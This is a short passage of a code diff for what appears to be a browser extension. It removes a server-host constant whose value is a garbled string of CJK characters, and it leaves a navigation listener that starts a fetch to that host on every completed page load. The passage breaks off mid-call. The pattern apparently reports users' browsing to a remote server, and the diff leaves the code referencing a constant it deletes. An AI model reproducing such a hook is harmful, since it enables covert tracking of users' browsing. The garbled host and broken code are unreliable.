@@ -1,5 +1,3 @@
-const SERVER_HOST = "扩灩湟桡捫敲.汥整"
-
 chrome.webNavigation.onCompleted.addListener((e) => {
     const url = `${SERVER_HOST}/u`;
     fetch(
